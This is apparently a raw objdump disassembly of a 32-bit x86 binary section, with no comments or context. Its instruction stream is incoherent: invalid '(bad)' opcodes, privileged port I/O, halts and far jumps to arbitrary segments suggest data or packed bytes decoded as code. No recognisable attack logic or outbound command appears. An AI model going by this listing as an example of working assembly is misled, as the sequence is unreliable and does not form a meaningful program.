  40180c:	mov    esi,0x6ae7d58e
  401811:	xor    DWORD PTR [ebp-0x16],ebp
  401814:	(bad)  
  401815:	jl     0x401866
  401817:	mov    ah,dh
  401819:	cmp    ebp,DWORD PTR [ecx-0x26eacf40]
  40181f:	sahf   
  401820:	mov    ch,0x69
  401822:	inc    ebp
  401823:	retf   0xd07
  401826:	test   eax,0x94bf65d7
  40182b:	sbb    al,0x89
  40182d:	fwait
  40182e:	gs call 0x14d3393f
  401834:	prefetcht0 BYTE PTR [edi-0x71b58890]
  40183b:	inc    eax
  40183c:	push   esi
  40183d:	in     eax,0x4c
  40183f:	dec    edi
  401840:	retf   
  401841:	adc    eax,0xece3efa7
  401846:	(bad)  
  401847:	pop    ebp
  401848:	push   ds
  401849:	ja     0x4018ba
  40184b:	mov    eax,esp
  40184d:	fistp  WORD PTR [ebp+0x59582050]
  401853:	mov    esi,es
  401855:	dec    esp
  401856:	jmp    0xf2e2:0xbfbbe43d
  40185d:	daa    
  40185e:	jmp    0x40182e
  401860:	push   ebx
  401861:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401862:	dec    ecx
  401863:	push   cs
  401864:	jmp    0x4017f3
  401866:	inc    esp
  401867:	stos   DWORD PTR es:[edi],eax
  401868:	push   0x6e
  40186a:	aaa    
  40186b:	aam    0xf3
  40186d:	nop
  40186e:	inc    esp
  40186f:	adc    al,0x39
  401871:	mov    ecx,0x4b2b27e9
  401876:	shl    eax,1
  401878:	sub    ah,dh
  40187a:	mov    dl,0x62
  40187c:	stos   BYTE PTR es:[edi],al
  40187d:	rcr    DWORD PTR [ebp-0x28],0x90
  401881:	mov    eax,ds:0x4b1393ae
  401886:	fstp   TBYTE PTR [edi]
  401888:	sahf   
  401889:	xor    DWORD PTR [edx+0x25],0x60
  40188d:	push   cs
  40188e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40188f:	or     DWORD PTR [esi-0x59],ebx
  401892:	add    al,0x4a
  401894:	das    
  401895:	dec    edx
  401896:	addr16 iret 
  401898:	(bad)  
  401899:	fldenv [esp+edx*2]
  40189c:	mov    edi,0x4e338ad8
  4018a1:	std    
  4018a2:	pop    edi
  4018a3:	add    esp,esi
  4018a5:	sub    edi,DWORD PTR [ecx-0x6b]
  4018a8:	sbb    edx,0x6c113e0b
  4018ae:	js     0x40184d
  4018b0:	rcr    DWORD PTR [esi],1
  4018b2:	dec    ecx
  4018b3:	mov    ah,0xf0
  4018b5:	or     dh,BYTE PTR gs:[esi+esi*2]
  4018b9:	xchg   esp,eax
  4018ba:	imul   edi,DWORD PTR [eax-0x22],0xffffff84
  4018be:	nop
  4018bf:	loopne 0x4018a1
  4018c1:	and    bh,BYTE PTR [ebx-0x28]
  4018c4:	into   
  4018c5:	mov    bl,0xbb
  4018c7:	dec    edi
  4018c8:	outs   dx,DWORD PTR ds:[esi]
  4018c9:	outs   dx,BYTE PTR ds:[esi]
  4018ca:	adc    ebx,edi
  4018cc:	iret   
  4018cd:	retf   0x1699
  4018d0:	inc    edx
  4018d1:	add    dh,BYTE PTR [ebx+0xf]
  4018d4:	lock pop edi
  4018d6:	fidiv  WORD PTR [esi+0x3a355ca2]
  4018dc:	sahf   
  4018dd:	popf   
  4018de:	mov    esp,0xfa449b8c
  4018e3:	test   al,0x87
  4018e5:	adc    ebp,edx
  4018e7:	dec    ebx
  4018e8:	cwde   
  4018e9:	mov    esi,0x6ea28289
  4018ee:	pop    ss
  4018ef:	(bad)  
  4018f0:	dec    edi
  4018f1:	pop    es
  4018f2:	sbb    eax,0x632c270e
  4018f7:	xchg   BYTE PTR [ecx+0x33388637],bl
  4018fd:	mov    ah,BYTE PTR [esi-0x26cbcff4]
  401903:	jne    0x4018b3
  401905:	pop    esi
  401906:	mov    dh,BYTE PTR [esi+0x3c]
  401909:	sbb    DWORD PTR [ecx+0x44e7796d],eax
  40190f:	mov    dl,0x18
  401911:	mov    al,0xdc
  401913:	icebp  
  401914:	fs and al,0xfa
  401917:	mov    edi,cs
  401919:	cld    
  40191a:	dec    ecx
  40191b:	jb     0x40193c
  40191d:	sub    BYTE PTR [eax+0xc],dl
  401920:	lods   eax,DWORD PTR ds:[esi]
  401921:	out    0x5f,eax
  401923:	mov    ah,0x24
  401925:	dec    ebp
  401926:	and    cl,bh
  401928:	or     DWORD PTR [ecx+0x58],ebx
  40192b:	pusha  
  40192c:	cmp    ch,cl
  40192e:	mov    WORD PTR [ecx],?
  401930:	jo     0x4018c9
  401932:	mov    eax,0x6ff3252c
  401937:	mov    dh,BYTE PTR [ebx]
  401939:	sbb    esp,DWORD PTR ds:0xeb29ced6
  40193f:	outs   dx,BYTE PTR ds:[esi]
  401940:	push   0x7822491a
  401945:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401946:	retf   0x735b
  401949:	icebp  
  40194a:	mov    dh,0xaa
  40194c:	pushf  
  40194d:	cmp    dl,BYTE PTR [esi*8+0x3dbdf916]
  401954:	ds nop
  401956:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401957:	clc    
  401958:	xor    BYTE PTR [ebp+eiz*2+0x198b2e7f],cl
  40195f:	in     eax,dx
  401960:	or     DWORD PTR [edi+eax*4-0x47],eax
  401964:	std    
  401965:	inc    ebp
  401966:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401967:	scas   al,BYTE PTR es:[edi]
  401968:	dec    edi
  401969:	stos   BYTE PTR es:[edi],al
  40196a:	in     al,dx
  40196b:	jne    0x4019a3
  40196d:	out    dx,al
  40196e:	iret   
  40196f:	in     eax,dx
  401970:	bound  ecx,QWORD PTR [eax+0x9]
  401973:	es into 
  401975:	in     al,dx
  401976:	cmp    ah,bl
  401978:	mov    ebp,0xb2e6e59e
  40197d:	leave  
  40197e:	dec    edx
  40197f:	push   0xd0785432
  401984:	push   0x5875b7e6
  401989:	push   es
  40198a:	(bad)  
  40198b:	aam    0xc0
  40198d:	out    dx,al
  40198e:	add    eax,0xcc3f19bb
  401993:	xchg   esp,eax
  401994:	push   ebp
  401995:	daa    
  401996:	pop    esi
  401997:	in     al,0xbf
  401999:	lea    edi,[edx+eiz*8+0x104fff8a]
  4019a0:	fwait
  4019a1:	and    al,0xec
  4019a3:	in     eax,dx
  4019a4:	daa    
  4019a5:	or     edx,eax
  4019a7:	das    
  4019a8:	ins    BYTE PTR es:[edi],dx
  4019a9:	cs push ebp
  4019ab:	pusha  
  4019ac:	xchg   ebx,eax
  4019ad:	mov    esp,0xbbd85e8c
  4019b2:	into   
  4019b3:	adc    BYTE PTR [ebx+0x46],bl
  4019b6:	lods   eax,DWORD PTR ds:[esi]
  4019b7:	xchg   ebx,eax
  4019b8:	sbb    BYTE PTR [esi+0x1871c258],al
  4019be:	inc    edi
  4019bf:	outs   dx,BYTE PTR ds:[esi]
  4019c0:	or     edx,esp
  4019c2:	das    
  4019c3:	xchg   edi,eax
  4019c4:	ja     0x4019e4
  4019c6:	leave  
  4019c7:	cmp    dl,BYTE PTR [ebp+0x40]
  4019ca:	sub    eax,0x77f5a974
  4019cf:	sub    eax,0xf8c3eb4d
  4019d4:	lock into 
  4019d6:	popa   
  4019d7:	test   al,0x8c
  4019d9:	fisub  DWORD PTR [ebx+0x53498847]
  4019df:	sub    eax,0xa6e78eab
  4019e4:	in     eax,dx
  4019e5:	pop    ss
  4019e6:	jmp    0x283a:0xf8c932a5
  4019ed:	xchg   esi,eax
  4019ee:	ins    DWORD PTR es:[edi],dx
  4019ef:	loopne 0x4019f0
  4019f1:	xchg   esi,eax
  4019f2:	jle    0x4019ce
  4019f4:	not    DWORD PTR [ecx+0x51]
  4019f7:	test   DWORD PTR [edx+0x3ef3e69d],esp
  4019fd:	push   eax
  4019fe:	loope  0x4019cb
  401a00:	imul   ebx,DWORD PTR [eax],0xffffffc3
  401a03:	push   esi
  401a04:	addr16 jno 0x401a51
  401a07:	mov    dl,0xaf
  401a09:	add    cl,bl
  401a0b:	mov    ch,0xc6
  401a0d:	xor    DWORD PTR [ebx+0x56],esi
  401a10:	sbb    cl,al
  401a12:	gs cld 
  401a14:	or     ch,BYTE PTR [esi-0x67]
  401a17:	mov    DWORD PTR [ecx-0x36],ebx
  401a1a:	out    0x80,al
  401a1c:	test   DWORD PTR [edx-0x3f],0xe7a6614e
  401a23:	aas    
  401a24:	clc    
  401a25:	js     0x4019ac
  401a27:	mov    ch,0x4a
  401a29:	push   ss
  401a2a:	cmp    eax,0xd40bef70
  401a2f:	inc    ebx
  401a30:	dec    ebx
  401a31:	and    BYTE PTR [edx+0x1f],dh
  401a34:	mov    al,0x4
  401a36:	out    dx,al
  401a37:	or     dh,0x9e
  401a3a:	sbb    bl,BYTE PTR [ebx+0x4d2ea2f6]
  401a40:	sub    eax,0x925fa596
  401a45:	imul   edx,DWORD PTR [edi],0x4037c2af
  401a4b:	mov    bl,0x8f
  401a4d:	out    0xe8,al
  401a4f:	cwde   
  401a50:	test   eax,0xedfe0164
  401a55:	stc    
  401a56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a57:	cmc    
  401a58:	and    ch,dl
  401a5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a5b:	push   ecx
  401a5c:	call   0x971f:0x90967eb4
  401a63:	(bad)  
  401a64:	sar    DWORD PTR [esi+0x77],1
  401a67:	mov    ecx,DWORD PTR [esi+0x26]
  401a6a:	push   eax
  401a6b:	mov    eax,ds:0xc12072e6
  401a70:	loope  0x401a64
  401a72:	retf   
  401a73:	mov    BYTE PTR ds:0x1b07a46b,0x3
  401a7a:	push   edx
  401a7b:	out    dx,eax
  401a7c:	sbb    eax,0xb9d42d03
  401a81:	outs   dx,BYTE PTR ds:[esi]
  401a82:	inc    esi
  401a83:	repnz fidiv DWORD PTR [ebx+eax*1+0x72054191]
  401a8b:	sbb    DWORD PTR [esi-0x453c99cc],ecx
  401a91:	pop    esp
  401a92:	shl    BYTE PTR [esi+0x46],1
  401a95:	add    DWORD PTR [ebx],eax
  401a97:	and    al,0x29
  401a99:	ja     0x401a71
  401a9b:	xchg   ebp,eax
  401a9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a9d:	add    esp,edi
  401a9f:	out    dx,al
  401aa0:	popf   
  401aa1:	mov    bh,0x78
  401aa3:	sbb    al,0xa8
  401aa5:	idiv   BYTE PTR [ebx]
  401aa7:	in     eax,dx
  401aa8:	mov    ds:0xc60fd6c9,eax
  401aad:	cmp    al,0x20
  401aaf:	mov    bl,0xb4
  401ab1:	add    al,0x77
  401ab3:	sub    edx,ebp
  401ab5:	fsubr  QWORD PTR [edx+0x21d0249d]
  401abb:	loopne 0x401aaf
  401abd:	inc    ecx
  401abe:	jg     0x401ad6
  401ac0:	cmp    eax,0x78e200d3
  401ac5:	dec    edi
  401ac6:	fs jecxz 0x401b02
  401ac9:	loope  0x401a7f
  401acb:	cli    
  401acc:	xchg   BYTE PTR [esi-0x132dda2b],dh
  401ad2:	push   ebp
  401ad3:	std    
  401ad4:	stos   BYTE PTR es:[edi],al
  401ad5:	xor    BYTE PTR [ecx+eax*8-0x73],0xfa
  401ada:	rcr    DWORD PTR [eax+edx*4],cl
  401add:	adc    dh,BYTE PTR [ecx+eax*8+0x50cb3cf]
  401ae4:	loope  0x401ad0
  401ae6:	aam    0x92
  401ae8:	js     0x401a79
  401aea:	sbb    al,0x95
  401aec:	fld    DWORD PTR [edi+0x60a152f3]
  401af2:	mov    ds:0xd680d860,al
  401af7:	repnz jmp 0x102b:0x44acf79e
  401aff:	mov    ch,0x10
  401b01:	ins    BYTE PTR es:[edi],dx
  401b02:	fsub   st(0),st
  401b04:	int3   
  401b05:	sti    
  401b06:	lds    esi,FWORD PTR [esi+0x1a]
  401b09:	mov    edi,edx
  401b0b:	ja     0x401ac5
  401b0d:	sti    
  401b0e:	sbb    bl,BYTE PTR [ebx-0x59288325]
  401b14:	jmp    0xe036:0x271da2b4
  401b1b:	or     al,0x4c
  401b1d:	dec    edx
  401b1e:	jb     0x401b60
  401b20:	and    eax,0xc25b59a2
  401b25:	jecxz  0x401b17
  401b27:	fcmovne st,st(5)
  401b29:	jne    0x401b23
  401b2b:	out    0xd7,al
  401b2d:	cmp    ebp,edi
  401b2f:	mov    bl,0x3d
  401b31:	pusha  
  401b32:	in     al,dx
  401b33:	cmp    eax,0xbd47d4ee
  401b38:	dec    esp
  401b39:	jp     0x401aee
  401b3b:	jg     0x401b3f
  401b3d:	ficom  DWORD PTR [edx]
  401b3f:	rol    BYTE PTR [edx],0x5a
  401b42:	jb     0x401bbc
  401b44:	rcl    ebx,0x2d
  401b47:	(bad)  
  401b48:	(bad)  
  401b4a:	lods   al,BYTE PTR ds:[esi]
  401b4b:	add    dl,bh
  401b4d:	jbe    0x401bb6
  401b4f:	xor    al,0x46
  401b51:	mov    bl,0x8b
  401b53:	add    BYTE PTR [ebp+0xe3e878f],dh
  401b59:	sbb    BYTE PTR [eax],dl
  401b5b:	and    cl,bl
  401b5d:	arpl   WORD PTR [ebx],dx
  401b5f:	xlat   BYTE PTR ds:[ebx]
  401b60:	adc    al,0xa2
  401b62:	jo     0x401b4a
  401b64:	cmp    dh,BYTE PTR [edi+edi*8+0x50]
  401b68:	jmp    0x401aff
  401b6a:	pop    ebx
  401b6b:	fld    QWORD PTR [esi+0x56d459dc]
  401b71:	lahf   
  401b72:	pop    ebx
  401b73:	ins    DWORD PTR es:[edi],dx
  401b74:	inc    esi
  401b75:	adc    al,0x11
  401b77:	xchg   ecx,eax
  401b78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b79:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b7b:	inc    esp
  401b7c:	mov    es,WORD PTR [esi-0x7b]
  401b7f:	ja     0x401b55
  401b81:	mov    cl,0x10
  401b83:	sbb    DWORD PTR [esi-0x1c],ecx
  401b86:	cmp    al,0x8b
  401b88:	jnp    0x745fe631
  401b8e:	fsubr  st,st(3)
  401b90:	pop    edi
  401b91:	inc    ebp
  401b92:	inc    eax
  401b93:	and    ecx,DWORD PTR [ebp-0x5d72411c]
  401b99:	repnz mov ebp,0x8556c14f
  401b9f:	xlat   BYTE PTR ds:[ebx]
  401ba0:	call   FWORD PTR [esi-0x305f6ee5]
  401ba6:	fcomp  DWORD PTR ds:0x3cf30f5
  401bac:	xchg   ebx,eax
  401bad:	and    ebp,esi
  401baf:	es inc edx
  401bb1:	sbb    dh,BYTE PTR [eax-0x58]
  401bb4:	out    0x46,eax
  401bb6:	out    0x75,al
  401bb8:	(bad)  [edx+0x913401d]
  401bbe:	or     DWORD PTR [ebx+0x182b87f6],edx
  401bc4:	sub    DWORD PTR [edi],esi
  401bc6:	cld    
  401bc7:	jmp    0xcb43b2c4
  401bcc:	push   eax
  401bcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bce:	lds    esi,FWORD PTR [ebx]
  401bd0:	jl     0x401c4e
  401bd2:	pop    edi
  401bd3:	inc    esp
  401bd4:	nop
  401bd5:	dec    edi
  401bd6:	test   DWORD PTR [ebx],ecx
  401bd8:	mov    ecx,0x438e15cf
  401bdd:	aaa    
  401bde:	xchg   edi,eax
  401bdf:	inc    ecx
  401be0:	rcr    cl,cl
  401be2:	xchg   edx,eax
  401be3:	push   cs
  401be4:	mov    ebx,0x66d7df85
  401be9:	xchg   edx,eax
  401bea:	stos   BYTE PTR es:[edi],al
  401beb:	clc    
  401bec:	fsubr  DWORD PTR [edi-0x4b]
  401bef:	sahf   
  401bf0:	xor    eax,0x568bbd68
  401bf5:	std    
  401bf6:	push   ss
  401bf7:	mov    eax,ds:0xd9c6064d
  401bfc:	push   esp
  401bfd:	stc    
  401bfe:	mov    WORD PTR [ebx],?
  401c00:	bnd jmp 0x401c81
  401c03:	push   eax
  401c04:	es dec eax
  401c06:	jp     0x401bed
  401c08:	mov    al,0xf7
  401c0a:	dec    ebx
  401c0b:	mov    DWORD PTR [esi-0x71],edi
  401c0e:	dec    ebx
  401c0f:	pop    esp
  401c10:	imul   edx,DWORD PTR ds:[esi+0x21],0x3d
  401c15:	and    eax,0x568c980
  401c1a:	outs   dx,BYTE PTR ds:[esi]
  401c1b:	xor    ebp,DWORD PTR [esi+0x38]
  401c1e:	pushf  
  401c1f:	mov    dh,0x92
  401c21:	push   edx
  401c22:	jmp    0xcff96fbb
  401c27:	jmp    0x9a940f8c
  401c2c:	ins    BYTE PTR es:[edi],dx
  401c2d:	jne    0x401bef
  401c2f:	inc    esi
  401c30:	fs lock mov dh,0x24
  401c34:	push   eax
  401c35:	leave  
  401c36:	ja     0x401c41
  401c38:	neg    esi
  401c3a:	mov    bl,0xaa
  401c3c:	inc    ecx
  401c3d:	dec    edi
  401c3e:	stos   BYTE PTR es:[edi],al
  401c3f:	test   al,0x69
  401c41:	dec    ecx
  401c42:	test   cl,ch
  401c44:	sub    DWORD PTR [ecx+0x19706362],ecx
  401c4a:	es je  0x401c39
  401c4d:	pop    ebp
  401c4e:	xor    BYTE PTR [ebp+0x74],0x24
  401c52:	push   esp
  401c53:	and    al,0x44
  401c55:	or     al,0x69
  401c57:	mov    ebp,0xc276d2ba
  401c5c:	pop    esp
  401c5d:	mov    al,ds:0x46fb2100
  401c62:	sbb    eax,0x67b43e53
  401c67:	pop    edi
  401c69:	add    al,0x98
  401c6b:	jae    0x401c9f
  401c6d:	std    
  401c6e:	sbb    eax,0x5dd57b9a
  401c73:	pop    esp
  401c74:	and    ebx,ecx
  401c76:	sbb    edi,DWORD PTR [edx]
  401c78:	xor    ebx,DWORD PTR [ebx-0x60cba481]
  401c7e:	(bad)  
  401c7f:	ds mov ah,0x9f
  401c82:	pop    ebx
  401c83:	fs addr16 push ss
  401c86:	adc    DWORD PTR [edx+0x6c],esp
  401c89:	ja     0x401c31
  401c8b:	cmp    dl,bh
  401c8d:	pop    eax
  401c8e:	test   ebx,ecx
  401c90:	jg     0x401c43
  401c92:	cmp    al,0xd2
  401c94:	in     eax,dx
  401c95:	sub    dl,BYTE PTR [eax]
  401c97:	popf   
  401c98:	lds    edi,FWORD PTR [ecx+0x6c5af168]
  401c9e:	cmp    ebp,DWORD PTR [ebx-0x3d6df1c8]
  401ca4:	icebp  
  401ca5:	jne    0x401c8c
  401ca7:	pop    ebx
  401ca8:	mov    ebp,0xd9898a86
  401cad:	cmp    DWORD PTR [eax-0x12],ebx
  401cb0:	or     eax,0x4e62559b
  401cb5:	inc    ebx
  401cb6:	xchg   esi,eax
  401cb7:	test   BYTE PTR [edx-0x4f],dh
  401cba:	daa    
  401cbb:	pop    DWORD PTR [esp+ecx*1-0x16]
  401cbf:	push   ecx
  401cc0:	call   0x3c665821
  401cc5:	sar    BYTE PTR [edx-0x574fdc81],1
  401ccb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ccc:	stos   DWORD PTR es:[edi],eax
  401ccd:	xor    al,0xd4
  401ccf:	inc    esp
  401cd0:	icebp  
  401cd1:	das    
  401cd2:	sub    cl,al
  401cd4:	jecxz  0x401d20
  401cd6:	into   
  401cd7:	cmc    
  401cd8:	outs   dx,BYTE PTR ds:[esi]
  401cd9:	test   ecx,0xd53c4330
  401cdf:	xchg   ebx,eax
  401ce0:	call   edx
  401ce2:	jmp    0x401c6b
  401ce4:	out    dx,eax
  401ce5:	xchg   edx,eax
  401ce6:	sbb    eax,0x2699b253
  401ceb:	call   0x8ece166f
  401cf0:	inc    ebx
  401cf1:	add    al,0xf8
  401cf3:	pop    ebx
  401cf4:	or     BYTE PTR [edx],0x62
  401cf7:	mov    bl,0xcb
  401cf9:	fisttp WORD PTR [ebp-0x1484d068]
  401cff:	jae    0x401cc7
  401d01:	and    edi,edi
  401d03:	and    DWORD PTR [ecx-0x2a23bfc],edi
  401d09:	sub    eax,0xfc468d8e
  401d0e:	and    eax,ebx
  401d10:	mov    dh,0x69
  401d12:	fistp  WORD PTR [edx+0x47c9997e]
  401d18:	stos   DWORD PTR es:[edi],eax
  401d19:	jnp    0x401ceb
  401d1b:	cwde   
  401d1c:	jb     0x401ce4
  401d1e:	js     0x401cfd
  401d20:	pop    esp
  401d21:	retf   
  401d22:	mov    ch,ah
  401d24:	inc    ecx
  401d25:	push   ds
  401d26:	jmp    0x29f2:0x6283ecdf
  401d2d:	popa   
  401d2e:	push   es
  401d2f:	and    al,0x65
  401d31:	lods   eax,DWORD PTR ds:[esi]
  401d32:	enter  0xa2fc,0x4b
  401d36:	aam    0x24
  401d38:	test   eax,0x791ef58
  401d3d:	sub    eax,ebx
  401d3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d40:	mov    WORD PTR ds:0xd17c76fe,?
  401d46:	cmp    edi,DWORD PTR [ecx+0x2a069cda]
  401d4c:	dec    ecx
  401d4d:	adc    al,0x6c
  401d4f:	and    DWORD PTR [edx],eax
  401d51:	test   BYTE PTR [ebp-0x7e],ah
  401d54:	or     BYTE PTR [edx+0x1f],al
  401d57:	rol    BYTE PTR [edx+ebx*2],cl
  401d5a:	xchg   ebx,eax
  401d5b:	arpl   WORD PTR [esi-0x2],cx
  401d5e:	ficomp WORD PTR [ecx+0x7083b7fb]
  401d64:	add    ebp,ebx
  401d66:	xchg   ebx,eax
  401d67:	ret    0x547a
  401d6a:	pushf  
  401d6b:	(bad)  
  401d6c:	push   edi
  401d6d:	pop    ds
  401d6e:	cmp    eax,0xf914bd6b
  401d73:	sub    DWORD PTR [ebp-0x64],0xffffffd4
  401d77:	mov    esp,0x9c6557cf
  401d7c:	xlat   BYTE PTR ds:[ebx]
  401d7d:	sub    dh,BYTE PTR [edx]
  401d7f:	add    eax,0x9f05a0a3
  401d84:	mov    ?,WORD PTR [eax-0x22]
  401d87:	xchg   BYTE PTR [ecx-0x18],bh
  401d8a:	inc    edx
  401d8b:	adc    al,0x2c
  401d8d:	jmp    0x19fe7c09
  401d92:	push   ss
  401d93:	xchg   ebx,eax
  401d94:	fucomp st(7)
  401d96:	rcl    DWORD PTR [eax+0x1],1
  401d99:	out    0x5d,al
  401d9b:	dec    eax
  401d9c:	ret    0x6002
  401d9f:	mov    edx,0xfc3d1617
  401da4:	loope  0x401d40
  401da6:	pop    ss
  401da7:	les    ecx,FWORD PTR [edi-0x6b690a00]
  401dad:	ds push esi
  401daf:	xchg   esi,eax
  401db0:	sbb    eax,0x7c6f77c8
  401db5:	lods   eax,DWORD PTR ds:[esi]
  401db6:	out    0x62,al
  401db8:	mov    esp,0xce858533
  401dbd:	jo     0x401e23
  401dbf:	fwait
  401dc0:	xchg   ebp,eax
  401dc1:	repz mov dh,0x55
  401dc4:	icebp  
  401dc5:	popa   
  401dc6:	dec    edx
  401dc7:	mov    ebp,0xab0b9a2
  401dcc:	lods   eax,DWORD PTR ds:[esi]
  401dcd:	popa   
  401dce:	fidivr WORD PTR [eax+0x6e]
  401dd1:	and    edi,DWORD PTR [edi-0x18]
  401dd4:	(bad)  
  401dd5:	mov    esi,0x9de416b0
  401dda:	retf   
  401ddb:	cld    
  401ddc:	sbb    ah,BYTE PTR [eax+0x4]
  401ddf:	mov    ebp,0xdb8f46c0
  401de4:	push   esi
  401de5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401de6:	and    BYTE PTR [ebp-0x20],0x4e
  401dea:	dec    edx
  401deb:	data16 jg 0x401e10
  401dee:	ret    0x9a50
  401df1:	call   0xdf1201cf
  401df6:	sbb    BYTE PTR ds:0xb52eb12f,bl
  401dfc:	mov    ch,0x16
  401dfe:	push   ss
  401dff:	dec    eax
  401e00:	inc    esi
  401e01:	popf   
  401e02:	xchg   ecx,eax
  401e03:	fwait
  401e04:	cmp    eax,0xa9a9b28d
  401e09:	dec    edi
  401e0a:	icebp  
  401e0b:	sbb    dh,BYTE PTR [eax]
  401e0d:	push   es
  401e0e:	or     al,0x31
  401e10:	mov    eax,ds:0x75fffa6e
  401e15:	sbb    cl,BYTE PTR [ebx]
  401e17:	add    DWORD PTR [ebx+0x1c],ecx
  401e1a:	stos   BYTE PTR es:[edi],al
  401e1b:	gs retf 0x8ab
  401e1f:	nop
  401e20:	sub    dl,0xf2
  401e23:	rcl    BYTE PTR [eax+0x2d1d7b6f],1
  401e29:	pop    esp
  401e2a:	in     eax,0x6f
  401e2c:	arpl   WORD PTR [eax+0x5d],cx
  401e2f:	cmp    DWORD PTR [ebx+0x2531d4d],ebp
  401e35:	ss xor esp,eax
  401e38:	icebp  
  401e39:	pop    ss
  401e3a:	loop   0x401ebb
  401e3c:	loope  0x401df8
  401e3e:	push   cs
  401e3f:	mov    BYTE PTR [edi-0x31d4b670],ch
  401e45:	push   0xa5556f2f
  401e4a:	dec    ebp
  401e4b:	pop    es
  401e4c:	mov    ebx,0x330bae70
  401e51:	(bad)  
  401e52:	jmp    0x401e9d
  401e54:	dec    ecx
  401e55:	aaa    
  401e56:	cmp    eax,0xb9ae96db
  401e5b:	xor    DWORD PTR [ecx],edx
  401e5d:	lea    ebp,[esi+ecx*1-0x73]
  401e61:	sub    al,0xa9
  401e63:	fs ja  0x401e60
  401e66:	inc    ebp
  401e67:	fld    TBYTE PTR [edi-0x2a09a11e]
  401e6d:	and    ch,BYTE PTR [esi]
  401e6f:	push   ss
  401e70:	inc    esi
  401e71:	dec    esi
  401e72:	call   0x5e587ae5
  401e77:	and    BYTE PTR [edi-0x29],ah
  401e7a:	mov    ds:0x7f147918,eax
  401e7f:	adc    BYTE PTR ds:0xd8d90b09,ch
  401e85:	mov    bl,0x11
  401e87:	jbe    0x401ef4
  401e89:	push   esi
  401e8a:	and    al,BYTE PTR [ebx]
  401e8c:	mov    esp,0x56297019
  401e91:	cmp    eax,DWORD PTR [eax+0x2b]
  401e94:	lods   al,BYTE PTR ds:[esi]
  401e95:	aas    
  401e96:	xor    bh,bl
  401e98:	xchg   BYTE PTR [eax+0x3365be91],ah
  401e9e:	and    dh,bh
  401ea0:	jg     0x401ea4
  401ea2:	mov    edi,0x7ab1b16a
  401ea7:	or     ebx,ebp
  401ea9:	out    dx,al
  401eaa:	mov    edi,0x9c7851a5
  401eaf:	push   ss
  401eb0:	mov    ecx,0xb693f26f
  401eb5:	cmp    BYTE PTR [ebx+0x5c],al
  401eb8:	inc    edi
  401eb9:	dec    edx
  401eba:	and    ah,dl
  401ebc:	fldcw  WORD PTR [eax]
  401ebe:	(bad)  
  401ebf:	ins    DWORD PTR es:[edi],dx
  401ec0:	stc    
  401ec1:	jg     0x401ef3
  401ec3:	push   esi
  401ec4:	sbb    al,0xbd
  401ec6:	iret   
  401ec7:	jmp    0x55c8:0xa8ff1b29
  401ece:	mov    ecx,0x7a0bb9f7
  401ed3:	arpl   WORD PTR [eax+0x4f3410b],dx
  401ed9:	pushf  
  401eda:	and    al,0xb8
  401edc:	test   eax,0xd6f1be46
  401ee1:	loopne 0x401f13
  401ee3:	loope  0x401e6b
  401ee5:	(bad)  
  401ee6:	into   
  401ee7:	es push 0xffffffba
  401eea:	loop   0x401f36
  401eec:	adc    esi,edi
  401eee:	pop    eax
  401eef:	loopne 0x401f30
  401ef1:	jmp    0x401f63
  401ef3:	cmp    bl,BYTE PTR [eax+0x1e]
  401ef6:	xchg   ebp,eax
  401ef7:	xor    edi,DWORD PTR [edi]
  401ef9:	jmp    0xa465:0xb8491a3e
  401f00:	xor    DWORD PTR es:[ebx-0x3b],esi
  401f04:	inc    edi
  401f05:	(bad)  
  401f06:	sub    al,0x58
  401f08:	cmp    DWORD PTR [ebp+0x342f6395],ecx
  401f0e:	shr    DWORD PTR [edx+0x5b5e39d5],1
  401f14:	or     eax,0x309092b0
  401f19:	daa    
  401f1a:	es test eax,0xd04ebd4e
  401f20:	les    esi,FWORD PTR [eax-0x15cff2d8]
  401f26:	hlt    
  401f27:	cli    
  401f28:	jp     0x401ee0
  401f2a:	mov    cl,0x57
  401f2c:	pop    esp
  401f2d:	ror    eax,cl
  401f2f:	xlat   BYTE PTR ds:[ebx]
  401f30:	mov    gs,WORD PTR [edx+eiz*4+0x4ed3f218]
  401f37:	je     0x401f17
  401f39:	xchg   ebx,eax
  401f3a:	imul   eax,DWORD PTR [edi+0x9daa36b],0xffffff86
  401f41:	lds    ecx,FWORD PTR [eax]
  401f43:	sub    DWORD PTR [edx-0x3b],esp
  401f46:	gs inc esi
  401f48:	adc    eax,0x39b74bf5
  401f4d:	dec    ebx
  401f4e:	jnp    0x401f54
  401f50:	pop    edx
  401f51:	mov    dh,0xfa
  401f53:	or     DWORD PTR [ebp+ecx*2-0x19],ebp
  401f57:	in     al,0x12
  401f59:	add    DWORD PTR [esi],0xb961b59a
  401f5f:	pop    ecx
  401f60:	push   es
  401f61:	ins    BYTE PTR es:[edi],dx
  401f62:	(bad)  
  401f64:	mov    ah,0x73
  401f66:	leave  
  401f67:	pop    edx
  401f68:	repz pop eax
  401f6a:	jg     0x401fa5
  401f6c:	rol    edi,0x30
  401f6f:	adc    al,BYTE PTR [edi+0x7d4768a6]
  401f75:	mul    BYTE PTR [esi+0x4f29ad16]
  401f7b:	neg    DWORD PTR [eax]
  401f7d:	add    eax,0x1ab6ecdd
  401f82:	push   esi
  401f83:	sti    
  401f84:	ds scas eax,DWORD PTR es:[edi]
  401f86:	cmp    esp,DWORD PTR fs:[ebx-0x4988e3ae]
  401f8d:	aam    0x13
  401f8f:	std    
  401f90:	pop    ebx
  401f91:	imul   edi,DWORD PTR [ebx-0x5bf79419],0x1e
  401f98:	stc    
  401f99:	in     eax,0xda
  401f9b:	cs cmp eax,0xd287cb4f
  401fa1:	inc    esp
  401fa2:	(bad)  
  401fa3:	jbe    0x40201d
  401fa5:	adc    DWORD PTR [ecx+ecx*2+0x67ac50e5],esi
  401fac:	dec    edi
  401fad:	push   cs
